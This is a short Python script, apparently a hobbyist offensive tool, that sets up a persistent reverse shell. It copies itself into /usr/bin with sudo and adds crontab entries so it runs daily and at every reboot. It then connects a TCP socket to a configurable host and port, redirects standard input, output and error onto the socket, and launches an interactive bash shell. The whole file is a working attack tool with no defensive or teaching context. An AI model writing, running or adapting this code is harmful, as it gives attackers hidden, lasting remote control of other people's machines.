#!/usr/bin/env python3

from subprocess import run # used for interacting with bash
import os 

# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyj33k                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Twitter :   @keyjeek                  #
#   Github  :   @keyj33k                  #
#   Insta   :   @keyjeek                  #
#   Version :   1.0.3                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # # 

def __persistence():
    import time
    os.system('sudo cp reverseshell.py /usr/bin') # copy the reverseshell to /usr/bin
    run(f'sudo chattr -i /usr/bin/reverseshell.py', shell=True) # make the script unmodifiable in /usr/bin
    run(f'echo "30 18 * * * /usr/bin/reverseshell.py" | crontab -e', shell=True) # add a cronjob for this file
    run(f'echo "@reboot /usr/bin/reverseshell.py" | tee -a /etc/crontab', shell=True) # add reverseshell.py to startup
    time.sleep(0.25)

class shell:
    
    def __init__(self, target_address, target_port): # assign the target address and the target port
        self.target_address = target_address
        self.target_port = target_port
        
reverse_connection = shell("127.0.0.1", int(5003)) # define target ip address and target port

if __name__ == "__main__":
    os.system('clear')
    __persistence() # call the persistence function
    from os import dup2
    import socket
    os.system('clear')

    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
    socket_sock = socket.socket(socket.AF_INET, 
                            socket.SOCK_STREAM) # use ipv4(AF_INET) and tcp(SOCK_STREAM) for the connection
    socket_sock.connect((reverse_connection.target_address, 
                            reverse_connection.target_port)) # start a connection to the target

    dup2(socket_sock.fileno(),0) # return stream integer file descriptor
    dup2(socket_sock.fileno(),1) # used for request I/O actions from the OS
    dup2(socket_sock.fileno(),2)
    
    # if you have any issues, try: comment line 51 out and uncommend line 52
    run(["/bin/bash", "-i"]) # finally run the bash console
    # run(["/bin/bash"], shell=True)

 
